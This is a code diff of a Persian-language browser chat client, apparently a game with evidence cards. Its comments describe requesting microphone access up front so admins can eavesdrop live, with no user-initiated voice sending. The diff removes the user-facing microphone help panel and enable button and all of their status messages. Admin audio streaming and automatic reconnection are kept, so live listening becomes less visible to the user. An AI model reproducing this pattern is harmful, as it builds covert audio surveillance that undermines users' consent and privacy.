@@ -133,20 +133,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // درخواست یک‌باره دسترسی میکروفون قبل از شروع جلسه جهت شنود زنده ادمین (بدون دکمه ارسال ویس توسط کاربر)
   initUserMicrophone();
-  document.getElementById('microphone-enable-btn')?.addEventListener('click', async () => {
-    if (await ensureLocalAudioStream()) {
-      clearTimeout(microphoneRecoveryTimer);
-      microphoneRecoveryTimer = null;
-      microphoneRecoveryAttempts = 0;
-      updateMicrophoneHelp('');
-      if (liveAudioRequested) {
-        await startPcmAudioStream();
-        for (const adminId of activeLiveAdminIds) await startLivePeer(adminId);
-      } else {
-        localStream.getAudioTracks().forEach(track => { track.enabled = false; });
-      }
-    }
-  });
   navigator.mediaDevices?.addEventListener?.('devicechange', () => {
     if (liveAudioRequested && !localStream?.getAudioTracks().some(track => track.readyState === 'live')) {
       microphoneRecoveryAttempts = 0;
@@ -209,18 +195,6 @@ async function initUserMicrophone() {
   } catch (err) {
     console.warn('⚠️ عدم دسترسی به میکروفون یا رد شدن پرمیشن:', err);
   }
-}
-
-function updateMicrophoneHelp(message) {
-  const help = document.getElementById('microphone-help');
-  const text = document.getElementById('microphone-help-text');
-  const button = document.getElementById('microphone-enable-btn');
-  // The microphone recovery control is a diagnostic affordance for test sessions.
-  // Browsers still handle the initial permission request through their own prompt.
-  const showDiagnostics = new URLSearchParams(window.location.search).get('test') === '1';
-  if (help) help.hidden = !message || !showDiagnostics;
-  if (text) text.textContent = message;
-  if (button) button.hidden = !navigator.mediaDevices?.getUserMedia;
 }
 
 // تغییر وضعیت رابط کاربری هنگام قفل یا باز شدن چت
@@ -1156,7 +1130,9 @@ function renderEvidence(msg, options = {}) {
   grid.insertBefore(card, later || null);
   const totalCards = grid.querySelectorAll('.evidence-card').length;
   const countEl = document.getElementById('evidence-count');
-  if (countEl) countEl.textContent = `${totalCards.toLocaleString('fa-IR')} مدرک`;
+  if (countEl) countEl.textContent = window.cyberBreachEngine?.isPlaying
+    ? `${totalCards.toLocaleString('fa-IR')} مدرک مخدوش‌شده`
+    : `${totalCards.toLocaleString('fa-IR')} مدرک`;
   const badgeEl = document.getElementById('evidence-tab-badge');
   if (badgeEl) badgeEl.textContent = totalCards.toLocaleString('fa-IR');
 
@@ -1709,7 +1685,6 @@ function scheduleMicrophoneRecovery() {
     const stream = await ensureLocalAudioStream();
     if (!stream) return scheduleMicrophoneRecovery();
     microphoneRecoveryAttempts = 0;
-    updateMicrophoneHelp('');
     socket.emit('audio_stream_status', { sessionId: sessionData.id, status: 'microphone_recovered' });
     await startPcmAudioStream();
     for (const adminId of activeLiveAdminIds) await startLivePeer(adminId);
@@ -1721,7 +1696,6 @@ function handleMicrophoneEnded(track) {
   localStream = null;
   stopPcmAudioStream(false);
   closeLivePeer();
-  updateMicrophoneHelp('میکروفون قطع شد. اتصال دستگاه و اجازهٔ مرورگر را بررسی کنید.');
   if (liveAudioRequested && socket?.connected) {
     socket.emit('audio_stream_status', { sessionId: sessionData.id, status: 'microphone_unavailable' });
     scheduleMicrophoneRecovery();
@@ -1737,7 +1711,6 @@ async function ensureLocalAudioStream() {
   if (microphoneRequest) return microphoneRequest;
   if (!navigator.mediaDevices?.getUserMedia) {
     console.warn('⚠️ دسترسی به میکروفون نیازمند پروتکل امن HTTPS است.');
-    updateMicrophoneHelp('دسترسی به میکروفون در این آدرس ممکن نیست؛ صفحه باید با HTTPS باز شود.');
     return null;
   }
   microphoneRequest = navigator.mediaDevices.getUserMedia({
@@ -1756,11 +1729,9 @@ async function ensureLocalAudioStream() {
       track.enabled = liveAudioRequested;
       track.onended = () => handleMicrophoneEnded(track);
     });
-    updateMicrophoneHelp('');
     return stream;
   }).catch(err => {
     console.error('عدم دسترسی به میکروفون:', err);
-    updateMicrophoneHelp('میکروفون در دسترس نیست. اجازهٔ مرورگر و اتصال میکروفون را بررسی کنید.');
     return null;
   }).finally(() => { microphoneRequest = null; });
   return microphoneRequest;
